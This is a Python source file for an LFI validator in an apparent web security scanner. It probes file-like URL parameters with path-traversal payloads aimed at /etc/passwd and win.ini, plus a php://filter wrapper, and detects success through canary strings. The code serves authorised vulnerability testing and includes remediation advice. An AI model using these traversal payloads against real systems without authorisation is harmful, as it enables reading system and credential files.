"""LFI validation — reads only its own canary via traversal, nothing else.

Probes file/path params with traversal sequences pointing at ubiquitous
system files, matching only well-known canary markers (e.g. `root:`).
Benign, read-only, authorised-target only.
"""
from __future__ import annotations

from typing import Any, Dict, List
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

from modules.session import SeverityLevel
from modules.validate.web_base import WebValidator


class LFIValidator(WebValidator):
    source = "validate.lfi"
    out_name = "lfi"

    FILE_PARAMS = {"file", "path", "page", "include", "inc", "template",
                   "theme", "lang", "language", "doc", "document", "view"}
    PAYLOADS = [
        ("unix-basic", "../../../../../../etc/passwd", "root:"),
        ("unix-filter", "php://filter/convert.base64-encode/resource=index", ""),
        ("win-basic", "..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
        ("dot-trick", "....//....//....//etc/passwd", "root:"),
    ]

    def test_url(self, url: str) -> Dict[str, Any]:
        parts = urlparse(url)
        params = dict(parse_qsl(parts.query))
        names = [n for n in params if n.lower() in self.FILE_PARAMS] or (
            list(params.keys())[:3])
        hits = []
        for name in names:
            for label, payload, canary in self.PAYLOADS:
                trial = dict(params)
                trial[name] = payload
                target = urlunparse(parts._replace(query=urlencode(trial)))
                try:
                    r = self._get(target)
                    if canary and canary in r.text:
                        hits.append({"param": name, "technique": label})
                        break
                except Exception:
                    continue
        return {"url": url, "hits": hits}

    def validate(self, url: str) -> Dict[str, Any]:
        return self.test_url(url)

    def run(self, target: str) -> Dict[str, Any]:
        self.logger.banner(f"LFI VALIDATION: {target}", style="bold red")
        results: Dict[str, Any] = {"target": target, "tested": [], "vulnerable": []}
        for url in self.candidate_urls(target):
            try:
                res = self.test_url(url)
            except Exception as e:
                res = {"url": url, "error": str(e)[:200], "hits": []}
            results["tested"].append(res)
            for hit in res.get("hits", []):
                results["vulnerable"].append({"url": url, **hit})
                self.add_finding(
                    f"LFI: param '{hit['param']}' reads local files ({hit['technique']})",
                    url, SeverityLevel.CRITICAL, ["lfi", "traversal", "file-read"],
                    "Local file content reflected via traversal. Do not "
                    "pivot to sensitive files without explicit scope.",
                    evidence=f"param={hit['param']} via={hit['technique']}",
                    remediation="Map user input to an allow-list of files. "
                                "Reject path separators. Chroot/jail the app.")
        self.save("lfi_report", results)
        self.logger.success(f"LFI: {len(results['tested'])} URLs, "
                            f"{len(results['vulnerable'])} hits")
        return results
